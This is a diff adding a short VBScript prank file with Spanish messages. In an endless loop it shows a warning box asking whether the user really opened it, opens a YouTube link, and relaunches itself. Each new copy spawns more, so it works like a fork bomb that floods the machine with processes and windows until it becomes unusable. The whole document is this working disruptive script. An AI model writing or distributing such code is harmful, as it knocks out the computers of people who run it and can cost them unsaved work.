@@ -1,0 +1,7 @@
+Set objShell = CreateObject("WScript.Shell")
+
+Do
+    MsgBox "En serio lo abriste?", 0 + 48, "Advertencia"
+    objShell.Run "https://www.youtube.com/watch?v=WkbXW7lv7bg&ab_channel=angel7456963" ' Abre una página web
+    objShell.Run "wscript.exe """ & WScript.ScriptFullName & """"
+Loop
